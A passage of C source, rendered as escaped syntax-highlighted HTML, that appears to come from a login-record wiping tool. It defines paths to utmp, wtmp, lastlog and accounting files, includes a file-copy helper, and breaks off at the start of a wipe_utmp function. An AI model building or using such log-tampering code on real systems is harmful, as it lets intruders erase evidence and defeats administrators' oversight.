class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef NO_ACCT\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;sys/acct.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;utmp.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;fcntl.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;unistd.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;stdio.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;ctype.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;string.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;pwd.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;time.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;stdlib.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef HAVE_LASTLOG_H\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;lastlog.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef HAVE_UTMPX\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;utmpx.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * Try to use the paths out of the include files. \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * But if we can\u0026#39;t find any, revert to the defaults.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef UTMP_FILE\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef _PATH_UTMP\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define UTMP_FILE\t_PATH_UTMP\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#else\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define UTMP_FILE\t\u0026#34;/var/adm/utmp\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef WTMP_FILE\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef _PATH_WTMP\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define WTMP_FILE\t_PATH_WTMP\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#else\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define WTMP_FILE\t\u0026#34;/var/adm/wtmp\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef LASTLOG_FILE\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef _PATH_LASTLOG\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define LASTLOG_FILE\t_PATH_LASTLOG\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#else\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define LASTLOG_FILE\t\u0026#34;/var/adm/lastlog\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef ACCT_FILE\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define ACCT_FILE\t\u0026#34;/var/adm/pacct\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef HAVE_UTMPX\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef UTMPX_FILE\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define UTMPX_FILE\t\u0026#34;/var/adm/utmpx\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifndef WTMPX_FILE\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define WTMPX_FILE\t\u0026#34;/var/adm/wtmpx\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif \u003c/span\u003e\u003cspan class=\"cm\"\u003e/* HAVE_UTMPX */\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#define BUFFSIZE\t8192\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/* \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * This function will copy the src file to the dst file.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003ecopy_file\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003esrc\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003edst\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \t\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003efd2\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\t\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003echar\u003c/span\u003e\t\u003cspan class=\"n\"\u003ebuf\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eBUFFSIZE\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esrc\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_RDONLY\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Opening %s during copy.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esrc\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edst\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_WRONLY\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"n\"\u003eO_CREAT\u003c/span\u003e \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"n\"\u003eO_TRUNC\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Creating %s during copy.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edst\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebuf\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eBUFFSIZE\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nf\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebuf\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Write error during copy.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Read error during copy.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd2\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * UTMP editing.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003ewipe_utmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \t\t\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan 